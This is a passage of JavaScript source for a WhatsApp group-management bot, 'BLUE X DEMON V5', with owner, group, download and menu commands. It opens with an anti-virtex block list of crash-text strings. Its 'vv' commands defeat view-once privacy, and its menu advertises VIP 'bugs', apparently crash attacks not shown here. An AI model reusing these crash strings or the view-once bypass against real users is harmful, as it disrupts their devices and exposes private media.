            if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ')) {
                if (isGroupAdmins) return reply('*VIRTEX DETECTED*')
                console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
                conn.sendMessage(m.chat, `*TANDAI TELAH DIBACA*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Bang yg ngirim virtex nih:* \nwa.me/${sender.split("@")[0]}`)
                if (!isBotGroupAdmins) {
                    return
                }
                if (isOwner) {
                    return
                }
                await conn.groupParticipantsUpdate(from, [sender], 'remove')
                conn.sendMessage(from, {
                    delete: m.key
                })
                await conn.sendMessage(`${botNumber}@s.whatsapp.net`, {
                    text: `*Hey owner a virtex was detected ${isGroup?`in ${groupName} group*`:''}`
                })
            }
        }
        try {
            switch (command) {
 case 'public': {
    if (!isOwner) return reply(mess.only.owner);
    
    settings.publik = true;
    reply("✅ the bot is now in *public* mode.");
    break;
}
case 'self': {
    if (!isOwner) return reply(mess.only.owner);

    settings.publik = false;
    reply("🔒 The bot is now in *private* mode.");
    break;
}
case 'mode': {
    reply(`📢 The bot is currently in *${settings.publik ? "Public" : "Private"}* mode.`);
    break;
}
case 'addowner': {
    if (!isOwner) return reply(mess.only.owner);
    
    let newOwner;
    if (m.quoted) {
        newOwner = m.quoted.sender;
    } else if (mentionByTag.length) {
        newOwner = mentionByTag[0];
    } else if (q) {
        newOwner = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return reply("Please tag, reply, or provide a number to add as an owner.");
    }

    let ownerFile = './database/owner.json';
    let owners = fs.existsSync(ownerFile) ? JSON.parse(fs.readFileSync(ownerFile, 'utf8')) : [];

    if (owners.includes(newOwner)) return reply("This number is already an owner.");

    owners.push(newOwner);
    fs.writeFileSync(ownerFile, JSON.stringify(owners, null, 2));

    reply(`Successfully added @${newOwner.replace('@s.whatsapp.net', '')} as an owner.`), { mentions: [newOwner] };
    break;
}

case 'delowner': {
    if (!isOwner) return reply(mess.only.owner);
    
    let removeOwner;
    if (m.quoted) {
        removeOwner = m.quoted.sender;
    } else if (mentionByTag.length) {
        removeOwner = mentionByTag[0];
    } else if (q) {
        removeOwner = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return reply("Please tag, reply, or provide a number to remove from owners.");
    }

    let ownerFile = './database/owner.json';
    let owners = fs.existsSync(ownerFile) ? JSON.parse(fs.readFileSync(ownerFile, 'utf8')) : [];

    if (!owners.includes(removeOwner)) return reply("This number is not an owner.");

    owners = owners.filter(owner => owner !== removeOwner);
    fs.writeFileSync(ownerFile, JSON.stringify(owners, null, 2));

    reply(`Successfully removed @${removeOwner.replace('@s.whatsapp.net', '')} from owners.`, { mentions: [removeOwner] });
    break;
}

case 'listowner': {
    try {
        let owners = JSON.parse(fs.readFileSync('./database/owner.json', 'utf8'));
        
        if (owners.length === 0) return reply('*No owners found.*');

        let ownerList = owners.map((owner, index) => `${index + 1}. @${owner.replace('@s.whatsapp.net', '')}`).join("\n");

        reply(`*Owner List:*\n\n${ownerList}`, { mentions: owners });
    } catch (error) {
        console.error('Error reading owner file:', error);
        reply('Failed to retrieve owner list.');
    }
    break;
}
case 'menu': {
    await loading();
    const randomImage = images[Math.floor(Math.random() * images.length)];

    conn.sendMessage(m.chat, {
        image: { url: randomImage },
        caption: fontx(`🕸️『 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓 』🕸️
> *𓃠*\`\`\`NAME : ${pushname}\`\`\`
> *𓃠*\`\`\`STATUS : ${isPremium ? '𝙿𝚛𝚎𝚖𝚒𝚞𝚖' : '𝙵𝚛𝚎𝚎'}\`\`\`
> *𓃠*\`\`\`MODE : ${publik ? '𝙿𝚞𝚋𝚕𝚒𝚌' : '𝚂𝚎𝚕𝚏'}\`\`\`
> *𓃠*\`\`\`PREFIX : ${prefix}\`\`\`
> *𓃠*\`\`\`VIP : ${isVip ? '𝚝𝚛𝚞𝚎' : '𝚏𝚊𝚕𝚜𝚎'}\`\`\`
> *𓃠*\`\`\`DATE : ${calender}\`\`\`
> *𓃠*\`\`\`TIME : ${timeWib}\`\`\`\n> 𝐒𝐓𝐑𝐎𝐍𝐆 𝐁𝐔𝐆𝐒 𝐅𝐎𝐑 𝐕𝐈𝐏 𝐔𝐒𝐄𝐑𝐒\n> ➥ bugmenu
 ${readmore}
> ─『 \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
> ${sign} addowner
> ${sign} delowner
> ${sign} listowner
> ${sign} self
> ${sign} public
> ${sign} mode
> ${sign} delete
> ${sign} read
> ${sign} setpp
> ${sign} block
> ${sign} unblock
> ${sign} setbio
> ${sign} update
> ${sign} restart
> ${sign} owner
> ${sign} clearchat
> ${sign} setprefix
> ${sign} getprefix
> ${sign} antidelete
> ${sign} setbotname
> ─────────────❐

> ─『 \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
> ${sign} ban
> ${sign} unban
> ${sign} listban
> ${sign} tagall
> ${sign} kick
> ${sign} add
> ${sign} mute
> ${sign} tag
> ${sign} tagme
> ${sign} kickall
> ${sign} invite
> ${sign} gcinfo
> ${sign} setppgc
> ${sign} setdesc
> ${sign} getppgc
> ${sign} delppgc
> ${sign} inspect
> ${sign} revoke
> ${sign} antilink
> ${sign} antivirtex
> ${sign} antibot
> ${sign} unmute
> ${sign} revoke
> ${sign} promote
> ${sign} demote
> ${sign} gclink
> ${sign} leavegc
> ${sign} listonline
> ${sign} opentime
> ${sign} closetime*
> ${sign} welcome
> ${sign} tagadmin*
> ${sign} listadmin
> ${sign} setgcname
> ${sign} resetgclink
> ${sign} antibadword
> ─────────────❐

> ─『 \`𝐌𝐄𝐃𝐈𝐀 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐒\` 』
> ${sign} play
> ${sign} song
> ${sign} video
> ${sign} sound1 to 95
> ${sign} yts <link>
> ${sign} ytmp3 <link>
> ${sign} ytmp4 <link>
> ${sign} all-in-one <link>
> ${sign} tiktok <link>
> ${sign} tiktok2 <link>
> ${sign} twitter <link>
> ${sign} facebook <link>
> ${sign} facebook2 <link>
> ${sign} instagram <link>
> ${sign} instagram2 <link>
> ─────────────❐

> ─『 \`𝐅𝐈𝐋𝐄 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐒\` 』
> ${sign} apk <name>
> ${sign} app <name>
> ${sign} apkfab <link>
> ${sign} gitclone <link>
> ${sign} mediafire <link>
> ${sign} githubdl <link>
> ─────────────❐

> ─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
> ${sign} vv
> ${sign} vv2
> ${sign} runtime
> ${sign} ping
> ${sign} areact
> ${sign} join
> ${sign} script
> ${sign} sticker
> ${sign} take
> ${sign} getjid
> ${sign} fancy
> ${sign} style
> ─────────────❐

> ─『 \`𝐒𝐄𝐀𝐑𝐂𝐇 𝐌𝐄𝐍𝐔\` 』
> ${sign} lyrics
> ${sign} bible
> ${sign} google
> ${sign} brave
> ${sign} playstore
> ${sign} happymod
> ${sign} pinterest
> ${sign} element
> ─────────────❐

> ─『 \`𝐀𝐈 𝐌𝐄𝐍𝐔\` 』
> ${sign} blueai
> ${sign} gemini
> ${sign} gemini2
> ${sign} gemini-pro
> ${sign} chatgpt
> ${sign} blackbox
> ─────────────❐

> ─『 \`𝐒𝐓𝐀𝐋𝐊𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
> ${sign} gitstalk
> ${sign} wachannel
> ${sign} tiktokstalk
> ${sign} freefirestalk
> ${sign} npmcheck
> ${sign} checkip
> ─────────────❐

> ─『 \`𝐀𝐃𝐕𝐀𝐍𝐂𝐄 𝐓𝐎𝐎𝐋𝐒\` 』
> ${sign} getdevice
> ${sign} hard-encrypt
> ${sign} tts
> ${sign} tts2
> ${sign} bing
> ${sign} shortlink
> ${sign} tinyurl
> ${sign} ssweb
> ${sign} weather 
> ${sign} get
> ${sign} text2pdf
> ─────────────❐

> ─『 \`𝐅𝐔𝐍 𝐌𝐄𝐍𝐔\` 』
> ${sign} flirt
> ${sign} truth
> ${sign} jokes
> ${sign} love
> ${sign} conf
> ${sign} angry
> ${sign} rizz
> ${sign} xmasfact
> ─────────────❐

> ─『 \`𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
> ${sign} anticall
> ${sign} listcase
> ${sign} alive
> ${sign} scan
> ${sign} translate
> ${sign} encode
> ${sign} decode
> ${sign} svcontact
> ${sign} obfuscate
> ${sign} checkip
> ${sign} broadcast
> ${sign} exchange
> ${sign} alwaysonline
> ${sign} autotyping
> ${sign} autoreadchat
> ${sign} randomcolor
> ${sign} getsession
> ${sign} checkcolor
> ${sign} autoviewstatus
> ─────────────❐

> ─『 \`𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔\` 』
> ${sign} nsfw
> ${sign} waifu
> ${sign} neko
> ${sign} trap
> ${sign} blowjob
> ${sign} cuckold
> ${sign} eba
> ${sign} pussy
> ${sign} yuri
> ${sign} zattai
> ${sign} foot
> ${sign} milf
> ─────────────❐

> ─『 \`𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐌𝐃𝐒\` 』
> ${sign} cecan-indo
> ${sign} cecan-china
> ${sign} cecan-japan
> ${sign} cecan-korea
> ${sign} cecan-thai
> ${sign} cecan-mal
> ${sign} blackpink
> ${sign} zoro
> ─────────────❐

> ─『 \`𝐄𝐏𝐇𝐎𝐓𝐎 𝐌𝐄𝐍𝐔\` 』
> ${sign} writetext
> ${sign} glitchtext
> ${sign} pixelglitch
> ${sign} neonglitch
> ${sign} royaltext 
> ${sign} flagtext  
> ${sign} flag3dtext 
> ${sign} glowingtext 
> ${sign} logomaker  
> ${sign} gradienttext  
> ${sign} luxurygold  
> ${sign} 1917style 
> ${sign} freecreate 
> ${sign} galaxystyle 
> ${sign} lighteffects
> ${sign} makingneon 
> ${sign} cartoonstyle 
> ${sign} deletingtext 
> ${sign} blackpinkstyle
> ${sign} papercutstyle
> ${sign} sandsummer  
> ${sign} effectclouds
> ${sign} blackpinklogo 
> ${sign} summerbeach 
> ${sign} advancedglow 
> ${sign} watercolortext 
> ${sign} underwatertext 
> ${sign} typographytext
> ${sign} galaxywallpaper
> ${sign} multicoloredneon  
> ─────────────❐
> ${caption}`)
    });

    await sleep(1500);
    sendvn(dmusic);
    break;
}
case 'tagall':
        if (!isGroup) return reply(mess.only.group);
    if (!isAdmins && !isOwner) return reply(mess.only.admin);
                let me = m.sender
                let teks = fontx(` 🕸️『 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓 』🕸️\n👀 *tagger*  @${me.split('@')[0]}\n\n`)
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break;
case 'tag': {
    if (!isGroup) return reply(mess.only.group);
    if (!isAdmins && !isOwner) return reply(mess.only.admin);

    let quotedMessage;
    if (m.quoted) {
        quotedMessage = m.quoted.text;
    } else if (q) {
        quotedMessage = q;
    } else {
        quotedMessage = `${themeemoji}${themeemoji}${themeemoji}`;
    }

    await conn.sendMessage(m.chat, {
        text: fontx(quotedMessage),
        mentions: participants.map(a => a.id)
    });

    break;
}
case 'ping': {
    const startTime = performance.now();
    const initialMessage = await conn.sendMessage(m.chat, {
        text: fontx(`*⚡𝙲𝙰𝙻𝙲𝚄𝙻𝙰𝚃𝙸𝙽𝙶 𝚂𝙿𝙴𝙴𝙳⚡*\n🔃\n> ${botName}`)
    });

    const endTime = performance.now();
    const latency = (endTime - startTime).toFixed(3);

let pingStatus = '';
if (latency < 50) {
    pingStatus = fontx('🚀 excellent connection');
} else if (latency < 100) {
    pingStatus = fontx('⚡ good connection');
} else if (latency < 200) {
    pingStatus = fontx('👌 average connection');
} else if (latency < 500) {
    pingStatus = fontx('😬 slow connection');
} else {
    pingStatus = fontx('🐢 poor connection');
}

    const finalMessage = fontx(`       *\`demon bot speed\`*\n *ping* ${latency}ms\n*status:* *${pingStatus}*\n> ${caption}`);

    await conn.relayMessage(m.chat, {
        protocolMessage: {
            key: initialMessage.key,
            type: 14,
            editedMessage: {
                conversation: finalMessage
            }
        }
    }, {});

    break;
}
case 'delete':
case 'del':
case 'd': {
    if (!isOwner) return reply(mess.only.owner);
    if (!m.quoted) return reply('Reply to a message to delete it.');

    try {
        await conn.sendMessage(m.chat, {
            delete: {
                remoteJid: m.quoted.key.remoteJid,
                fromMe: m.quoted.key.fromMe,
                id: m.quoted.key.id,
                participant: m.quoted.key.participant || m.quoted.sender
            }
        });
        await conn.sendMessage(m.chat, {
            delete: {
                remoteJid: m.key.remoteJid,
                fromMe: true,
                id: m.key.id
            }
        });

    } catch (err) {
        console.log("Error while deleting messages:", err);
    }
    break;
}
case 'read':
case 'vv': {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    await loading();
    
    if (!m.quoted) return reply(`Reply to a view once message.`);
    if (m.quoted.message?.viewOnceMessage?.message === undefined) {
        return reply(`This is not a view once message.`);
    }
    
    try {
        let msg = m.quoted.message.viewOnceMessage.message;
        let type = Object.keys(msg)[0];
        let mediaStream = await downloadContentFromMessage(msg[type], type === 'imageMessage' ? 'image' : 'video');
        
        let buffer = Buffer.from([]);
        for await (const chunk of mediaStream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        let fileName = type === 'videoMessage' ? 'media.mp4' : 'media.jpg';
        let caption = msg[type]?.caption || '';

        if (type === 'videoMessage') {
            await conn.sendMessage(m.chat, { video: buffer, caption: caption }, { quoted: m });
        } else if (type === 'imageMessage') {
            await conn.sendMessage(m.chat, { image: buffer, caption: caption }, { quoted: m });
        }
    } catch (error) {
        console.error("Error in vv case:", error);
        reply("An error occurred while processing the view once message. Please try again later.");
    }
    break;
}
case 'vv2': {
    if (!isOwner) return reply(mess.only.owner);
    await loading();

    if (!m.quoted) return reply(`Reply to a view once message.`);
    if (m.quoted.message?.viewOnceMessage?.message === undefined) {
        return reply(`This is not a view once message.`);
    }

    try {
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
        let msg = m.quoted.message.viewOnceMessage.message;
        let type = Object.keys(msg)[0];
        let mediaStream = await downloadContentFromMessage(msg[type], type === 'imageMessage' ? 'image' : 'video');
        
        let buffer = Buffer.from([]);
        for await (const chunk of mediaStream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        let fileType = type === 'videoMessage' ? 'media.mp4' : 'media.jpg';
        let caption = msg[type]?.caption || `${botName}`;

        await conn.sendMessage(m.chat, {
            [fileType === 'media.mp4' ? 'video' : 'image']: buffer,
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in vv2 case:", error);
        reply("An error occurred while processing the view once message. Please try again later.");
    }
    break;
}
case 'runtime': {
    let data = global.db.data.others['runtime']
    let time = (new Date - data.runtime) || 'long time'
    reply(`${themeemoji} \`RUNTIME\` ${themeemoji}\n*${runtime(process.uptime())}*`)
}
break
case 'kick': {
    if (!isGroup) return reply(mess.only.group)
    await loading()
    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
    if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)

    let mentioned = []
    if (m.quoted) {
        mentioned = [m.quoted.sender]
    } else if (mentionByTag && mentionByTag.length > 0) {
        mentioned = mentionByTag
    } else if (args[0]) {
        mentioned = [`${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`]
    }

    if (mentioned.length === 0) {
        return reply('Please reply to a user, tag someone, or provide a number to kick.')
    }

    try {
        await conn.groupParticipantsUpdate(m.chat, mentioned, 'remove')
        reply(`Successfully kicked ${mentioned.map(v => `@${v.split('@')[0]}`).join(', ')}`, { mentions: mentioned })
    } catch (error) {
        console.error('Error in kick case:', error)
        reply('Failed to kick the user. Make sure I have the correct permissions.')
    }
    break
}
case 'add': {
    if (!isGroup) return reply(mess.only.group)
    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
    if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
    await loading()
    let number
    if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '')
    } else if (m.quoted && m.quoted.sender) {
        number = m.quoted.sender.split('@')[0]
    } else {
        return reply('Please provide a number or reply to a user to add.')
    }

    const user = number.includes('@s.whatsapp.net') ? number : `${number}@s.whatsapp.net`

    try {
        await conn.groupParticipantsUpdate(m.chat, [user], 'add')
        await conn.sendMessage(m.chat, {
            text: fontx(`Successfully added @${number}`),
            mentions: [user]
        }, {
            quoted: m
        })
    } catch (error) {
        reply('Failed to add the user. Make sure the number is valid and I have the correct permissions.')
        console.error(error)
    }
    break
}
case 'getsession': {
    if (!isOwner) return reply(mess.only.owner)
    await loading()
    const credsPath = './session/creds.json'
    const fs = require('fs')

    try {
        if (!fs.existsSync(credsPath)) {
            return reply('Sorry, the session file does not exist.')
        }

        await conn.sendMessage(m.chat, {
            document: fs.readFileSync(credsPath),
            mimetype: 'application/json',
            fileName: 'creds.json'
        }, {
            quoted: m
        })
    } catch (error) {
        console.error(error)
        reply(`An error occurred: ${error.message}`)
    }
    break
}
                case 'mute': {
                    if (!m.isGroup) return reply(mess.only.group);
                    if (!isOwner && !isAdmins) return reply(mess.only.admin);
                    if (!isBotAdmins) return reply(mess.only.Badmin);
                    try {
                        await loading()
                        await conn.groupSettingUpdate(m.chat, 'announcement');
                        reply(mess.success);
                    } catch (err) {
                        console.error(err);
                        reply('Failed to mute the group. Please try again.');
                    }
                    break;
                }
                case 'unmute': {
                    if (!m.isGroup) return reply(mess.only.group);
                    if (!isOwner && !isAdmins) return reply(mess.only.admin);
                    if (!isBotAdmins) return reply(mess.only.Badmin);
                    try {
                        await loading()
                        await conn.groupSettingUpdate(m.chat, 'not_announcement');
                        reply(mess.success);
                    } catch (err) {
                        console.error(err);
                        reply('Failed to unmute the group. Please try again.');
                    }
                    break;
                }
                case 'welcome': {
                    if (!isGroup) return reply(mess.only.group)
                    if (!isAdmins && !isOwner) return reply(mess.only.admin)
                    if (!q) return reply("Enter the query 'on' or 'off'");
                    await loading()
                    if (q == 'on') {
                        if (chat.welcome == true) return reply('Welcome is already active');
                        db.data.chats[from].welcome = true;
                        reply('successfully activated welcome in this group');
                    } else if (q == 'off') {
                        if (chat.welcome == false) return reply('welcome is already inactive');
                        db.data.chats[from].welcome = false;
                        reply('successfully deactivated welcome in this group');
                    } else reply('Choose "on" or "off"');
                }
                break;
                case 'promote':
                    if (!isGroup && !isGroupAdmins) return reply(mess.only.group)
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                    await loading()
                    let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await conn.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                    reply(mess.success)
                    break
                case 'demote':
                    if (!isGroup && !isGroupAdmins) return reply(mess.only.group)
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                    await loading()
                    let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await conn.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                    reply(mess.success)
                    break
                case 'tagadmin':
                case 'listadmin': {
                    if (!m.isGroup) return reply(mess.only.group)
                    const groupAdmins = participants.filter(p => p.admin)
                    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
                    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-` [0] + '@s.whatsapp.net'
                    let text = fontx(`   
*Group Admins:*
${listAdmin}
`.trim())
                    conn.sendMessage(m.chat, {
                        text: text,
                        mentions: [...groupAdmins.map(v => v.id), owner]
                    }, {
                        quoted: m
                    })
                }
                break
                case 'tagme': {
                    let menst = [sender]
                    conn.sendMessage(from, {
                        text: `@${senderNumber}`,
                        mentions: menst
                    })
                }
                break
                case 'kickall': {
                    if (!isGroup && !isGroupAdmins) return reply(mess.only.group)
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                    const xeonkickall = (args[0] === 'numBut') ?
                        q.replace(`${args[0]} `, '').split('|') :
                        (Number(args[0])) ?
                        groupMetadata.participants
                        .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${botNumber}@s.whatsapp.net`)
                        .map(item => item.id) :
                        groupMetadata.participants
                        .filter(item => item.id !== botNumber && item.id !== `${botNumber}@s.whatsapp.net`)
                        .map(item => item.id);
                    if (chat.welcome == false)
                        db.data.chats[from].welcome = false
                    for (let remove of xeonkickall) {
                        await conn.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
                        await sleep(100);
                    }
                    reply(mess.success);
                }
                break
                case 'setppgc': {
                    if (!isGroup) return reply(mess.only.group)
                    if (!isGroupAdmins) return reply(mess.only.admin)
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                    await loading()
                    if (isImage || isQuotedImage) {
                        let media = await conn.downloadAndSaveMediaMessage(quoted, makeid(5))
                        await conn.updateProfilePicture(from, {
                                url: media
                            })
                            .then(res => {
                                reply(mess.success)
                                fs.unlinkSync(media)
                            }).catch(() => reply(mess.error.api))
                    } else {
                        reply(`Send/reply images with captions ${command}`)
                    }
                }
                break
                case 'getppgc':
                    if (!isGroup) return reply(mess.only.group)
                    if (!isGroupAdmins) return reply(mess.only.admin)
                    await loading()
                    try {
                        var ppimg = await conn.profilePictureUrl(from, 'image')
                    } catch (err) {
                        console.log(err)
                        var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                    await conn.sendMessage(from, {
                        image: {
                            url: ppimg
                        }
                    }, {
                        quoted: m
                    })
                    break
                case 'delppgc': {
                    if (!isGroup) return reply(mess.only.group)
                    if (!isGroupAdmins) return reply(mess.only.admin)
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                    await loading()
                    await conn.removeProfilePicture(from)
                }
                break
                case 'setnamegc':
                case 'setgcname': {
                    if (!isGroup) return reply(mess.only.group);
                    if (!isGroupAdmins) return reply(mess.only.admin);
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin);
                    if (!q || q.trim().length === 0) return reply(`Usage: ${command} <new group name>`);

                    await conn.groupUpdateSubject(from, q)
                        .then(() => {
                            reply(mess.success);
                        })
                        .catch(() => {
                            reply(mess.error.api);
                        });
                    break;
                }

                case 'setdesc': {
                    if (!isGroup) return reply(mess.only.group);
                    if (!isGroupAdmins) return reply(mess.only.admin);
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin);
                    if (!q || q.trim().length === 0) return reply(`Usage: ${command} <new group description>`);

                    await conn.groupUpdateDescription(from, q)
                        .then(() => {
                            reply(mess.success);
                        })
                        .catch(() => {
                            reply(mess.error.api);
                        });
                    break;
                }
               case 'inspect': {
                    const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
                    let code = q.match(rex1);
                    if (code === null) return reply("No invite url detected.");
                    code = code[0].replace("chat.whatsapp.com/", "");
                    let nana = await conn.groupGetInviteInfo(code)
                    //console.log(nana)
                    let {
                        id,
                        subject,
                        creator,
                        creation,
                        desc,
                        descId
                    } = await conn.groupGetInviteInfo(code).catch(async () => {
                        return reply("Invalid invite url.");
                    });
                    let text = fontx(
                        `Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
Create At: ${new Date(creation * 1000).toLocaleString()}` + `${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`)
                    reply(text)

                }
                break
                case 'revoke':
                case 'resetgclink': {
                    if (!isGroup) return reply(mess.only.group)
                    if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                    conn.groupRevokeInvite(from)
                }
                break

                case 'opentime': {
                    if (!isGroup) return reply(mess.only.group);
                    if (!isGroupAdmins) return reply(mess.only.admin);
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin);

                    if (args[1] == "seconds") {
                        var timer = args[0] * `1000`;
                    } else if (args[1] == "minutes") {
                        var timer = args[0] * `60000`;
                    } else if (args[1] == "hours") {
                        var timer = args[0] * `3600000`;
                    } else if (args[1] == "days") {
                        var timer = args[0] * `86400000`;
                    } else {
                        return reply("*Choose:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
                    }

                    reply(`Open time ${q} starts now`);
                    setTimeout(() => {
                        const open = fontx(`*On time*: The group is now opened by an admin\nMembers can now send messages`);
                        conn.groupSettingUpdate(from, 'not_announcement');
                        reply(open);
                    }, timer);
                    break;
                }

                case 'closetime': {
                    if (!isGroup) return reply(mess.only.group);
                    if (!isGroupAdmins) return reply(mess.only.admin);
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin);

                    if (args[1] == "seconds") {
                        var timer = args[0] * `1000`;
                    } else if (args[1] == "minutes") {
                        var timer = args[0] * `60000`;
                    } else if (args[1] == "hours") {
                        var timer = args[0] * `3600000`;
                    } else if (args[1] == "days") {
                        var timer = args[0] * `86400000`;
                    } else {
                        return reply(`Example: ${prefix}closetime 5 seconds`);
                    }

                    let ko = await conn.sendMessage(from, {
                        text: `Close time ${q} starts now`
                    }, {
                        quoted: m
                    });
                    setTimeout(() => deleteMessage(ko), 5000);

